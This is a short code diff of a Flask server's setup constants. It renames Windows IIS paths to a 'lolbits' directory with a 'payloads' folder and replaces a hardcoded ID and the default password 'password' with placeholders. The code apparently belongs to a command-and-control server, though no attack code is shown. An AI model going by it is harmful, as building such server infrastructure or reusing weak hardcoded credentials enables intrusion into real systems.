@@ -15,13 +15,13 @@ app.static_folder = 'static'
 
 
 #Initial setup
-InitialId = "abcde1234"
-AuthPath = "C:\\inetpub\\wwwroot\\bits\\config\\auth.txt"
+InitialId = "<ident8>"
+AuthPath = "C:\\inetpub\\wwwroot\\lolbits\\config\\auth.txt"
 Contid = "7061796c676164"
 RestoreKeys = [str(uuid4()),str(uuid4()),str(uuid4())]
-ReadPath = "C:\\inetpub\\wwwroot\\bits\\files\\"
-Password = "password"
-Payloads = "C:\\inetpub\\wwwroot\\bits\\payloads\\"
+ReadPath = "C:\\inetpub\\wwwroot\\lolbits\\files\\"
+Password = "<ident4>"
+Payloads = "C:\\inetpub\\wwwroot\\lolbits\\payloads\\"
 
 @app.route('/', methods=['GET'])
 def index():
